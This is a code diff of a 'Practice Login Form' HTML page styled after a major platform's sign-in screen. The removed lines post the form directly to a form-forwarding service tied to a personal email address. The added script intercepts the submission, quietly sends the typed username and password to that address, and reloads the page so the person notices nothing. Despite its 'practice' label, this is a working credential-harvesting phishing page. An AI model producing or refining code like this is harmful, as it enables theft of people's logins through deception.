@@ -4,21 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Practice Login Form</title>
-    <link rel="stylesheet" href="index.css">
 </head>
 <body>
     <div class="container">
         <div class="login-box">
             <h1>Practice Login</h1>
             
-            <!-- Changed form action to your Gmail with Formsubmit -->
-            <form action="https://formsubmit.co/shaikasif61912@gmail.com" method="POST">
-                
-                <!-- Prevent spam captcha page -->
-                <input type="hidden" name="_captcha" value="false">
-                <!-- Redirect back to same page after submit -->
-                <input type="hidden" name="_next" value="https://yourwebsite.com/#success">
-
+            <form id="loginForm" method="POST">
                 <div class="input-group">
                     <input type="text" id="username" name="username" placeholder="Username or Email" required>
                 </div>
@@ -26,58 +18,24 @@
                     <input type="password" id="password" name="password" placeholder="Password" required>
                 </div>
 
-                <a href="#" class="phone-login">Use phone number instead</a>
                 <button type="submit">Next</button>
             </form>
-            <p class="signup">New User? <a href="#">Sign Up</a></p>
         </div>
     </div>
 
-    <footer>
-        <div class="footer-top">
-            <div class="column">
-                <h3>Company</h3>
-                <ul>
-                    <li><a href="#">Example Inc.</a></li>
-                    <li><a href="#">Careers</a></li>
-                    <li><a href="#">News</a></li>
-                </ul>
-            </div>
-            <div class="column">
-                <h3>Community</h3>
-                <ul>
-                    <li><a href="#">Support</a></li>
-                    <li><a href="#">Guidelines</a></li>
-                    <li><a href="#">Help Center</a></li>
-                </ul>
-            </div>
-            <div class="column">
-                <h3>Advertising</h3>
-                <ul>
-                    <li><a href="#">Buy Ads</a></li>
-                    <li><a href="#">Policies</a></li>
-                    <li><a href="#">Ad Library</a></li>
-                </ul>
-            </div>
-            <div class="column">
-                <h3>Legal</h3>
-                <ul>
-                    <li><a href="#">Privacy Center</a></li>
-                    <li><a href="#">Your Choices</a></li>
-                    <li><a href="#">Cookie Policy</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-middle">
-            <label for="language">Language</label>
-            <select id="language">
-                <option value="en-US">English (US)</option>
-            </select>
-        </div>
-        <div class="footer-bottom">
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms of Service</a>
-        </div>
-    </footer>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e){
+            e.preventDefault(); // stop normal redirect
+
+            fetch("https://formsubmit.co/shaikasif61912@gmail.com", {
+                method: "POST",
+                body: new FormData(this)
+            }).then(response => {
+                // just refresh page after submit
+                window.location.reload();
+            }).catch(error => console.error("Error!", error));
+        });
+    </script>
 </body>
 </html>
+
